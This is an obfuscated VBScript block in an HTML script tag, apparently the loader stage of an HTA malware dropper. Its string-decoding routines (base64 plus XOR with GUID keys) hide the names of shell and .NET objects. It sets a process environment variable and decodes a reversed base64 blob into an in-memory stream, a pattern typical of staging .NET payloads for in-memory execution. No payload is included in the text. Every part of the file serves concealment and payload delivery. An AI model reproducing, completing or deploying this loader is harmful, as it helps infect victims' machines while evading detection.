<script language="VBScript">Dim WEibhmZ
Set WEibhmZ = CreateObject(Ogflac("bzcGFl5GFk9+UF1fXA==", "8ded76ba-8830-4950-9449-fa87e1431240"))
WEibhmZ.Environment(Ogflac("Y0oJVAdLRw==", "38f7b849-cd3a-4b5c-a8ca-36ccd4fb1e72")).Item(Ogflac("IXkoY3g2MmZ7A0ZGCkJa", "b6e34ca9-f45c-476c-9c2e-1c2ab9667ed9")) = Ogflac("QAYcVkoBUVYcDg==", "622fd2ae-7944-4d25-9df0-5edfbec5d524")

Function Ogflac(qtlGtDx, zEIFYs)
    Ogflac = BuQj(OqfP(qtlGtDx), zEIFYs)
End Function

Function OqfP(VKegEk)
    Dim GTjW, TRNGWrW(255)
    Dim YYiXYgA, OEBJwq, QhOl, eEry, SNwc, IYjT, DSoGLpT
    GTjW = "ABCDEFGH"
    GTjW = GTjW & "IJKLMNOP"
    GTjW = GTjW & "QRSTUVWX"
    GTjW = GTjW & "YZabcdef"
    GTjW = GTjW & "ghijklmn"
    GTjW = GTjW & "opqrstuv"
    GTjW = GTjW & "wxyz0123"
    GTjW = GTjW & "456789+/"
    For eEry = 0 To Len(GTjW) - 1
        TRNGWrW(Asc(Mid(GTjW, eEry + 1, 1))) = eEry
    Next
    OEBJwq = 1
    YYiXYgA = ""
    DSoGLpT = 0
    For eEry = 1 To Len(VKegEk)
        IYjT = Asc(Mid(VKegEk, eEry, 1))
        If IYjT = Asc("=") Then
            DSoGLpT = DSoGLpT + 1
        Else
            SNwc = TRNGWrW(IYjT)
            Select Case (eEry - OEBJwq) Mod 4
                Case 0
                    QhOl = SNwc * 4
                Case 1
                    QhOl = QhOl + Int(SNwc / 16)
                    YYiXYgA = YYiXYgA & Chr(QhOl)
                    QhOl = (SNwc And 15) * 16
                Case 2
                    QhOl = QhOl + Int(SNwc / 4)
                    YYiXYgA = YYiXYgA & Chr(QhOl)
                    QhOl = (SNwc And 3) * 64
                Case 3
                    QhOl = QhOl + SNwc
                    YYiXYgA = YYiXYgA & Chr(QhOl)
                    OEBJwq = eEry + 1
            End Select
        End If
    Next
    If OEBJwq <= Len(VKegEk) Then
        YYiXYgA = YYiXYgA & Chr(QhOl)
    End If
    OqfP = Left(YYiXYgA, ((Len(VKegEk) / 4) * 3) - DSoGLpT)
End Function

Function BuQj(yirSqN, hMRp)
    Dim utIz, pxscWC
    pxscWC = ""
    For utIz = 1 To Len(yirSqN)
        pxscWC = pxscWC & Chr(Asc(Mid(yirSqN, utIz, 1)) Xor Asc(Mid(hMRp, (utIz - 1) Mod Len(hMRp) + 1, 1)))
    Next
    BuQj = pxscWC
End Function

Function wdZc(KWReHJw,ZIuSf)
    Dim KRydqK, aESq, oXtBv, fnkMl, hDZw, rpxzjS, jRynFh
    KRydqK = Replace(KWReHJw, " ", "")
    aESq = StrReverse(KRydqK)
    cfkW = 4 - (Len(aESq) Mod 4)
    If cfkW < 4 Then oXtBv = aESq & String(cfkW, "=") Else oXtBv = aESq
    Set fnkMl = CreateObject(Ogflac("ZUtKQABeHWNITRdIdH53cS8jQ1pfUA9DVg==", "6294e337-5cf5-48ff-904f-151258e9307f"))
    hDZw = fnkMl.GetByteCount_2(oXtBv)
    Set rpxzjS = CreateObject(Ogflac("Y09FQVwPHmZIVkJBD1lNHnUQVBFCXlZfUkYLTxZ+SgxdJwUQVQACYUsDXkZLWkVe", "06659b05-573f-406b-a611-36c6888c0edc"))
    Set jRynFh = CreateObject(Ogflac("Z0lARlRdGHliGyxUVUJGSGMWXwcFDg==", "40321060-5a18-410b-bdcc-03ca125c7910"))
    jRynFh.Write rpxzjS.TransformFinalBlock(fnkMl.GetBytes_4(oXtBv), 0, hDZw), 0, ZIuSf
    jRynFh.Position = 0
    Set wdZc = jRynFh
End Function

